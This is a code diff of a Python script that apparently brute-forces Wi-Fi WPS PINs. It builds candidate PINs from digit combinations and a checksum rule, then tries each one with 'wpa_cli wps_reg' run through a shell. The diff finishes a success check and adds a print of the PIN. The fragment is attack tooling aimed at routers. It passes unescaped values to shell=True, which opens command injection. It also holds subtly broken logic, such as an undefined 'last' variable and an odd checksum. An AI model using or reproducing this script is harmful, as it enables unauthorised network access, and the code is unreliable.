@@ -53,7 +53,9 @@ def test_wps_pin(pin):
     command = f"wpa_cli -i wlan0 wps_reg {ssid} {pin}"
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
     if result.returncode == 0:
-   
+        return True
+    else:
+        return False
 def mains():
     pin_file = "p1.txt"
     pin1 = ""
@@ -94,3 +96,4 @@ while True:
                     for combination in combinations:
                         if (sum(combination) * 3 + last_digit) % 10 == 0:
                             pin = ''.join(str(digit) for digit in combination) + str(last)
+print(pin)
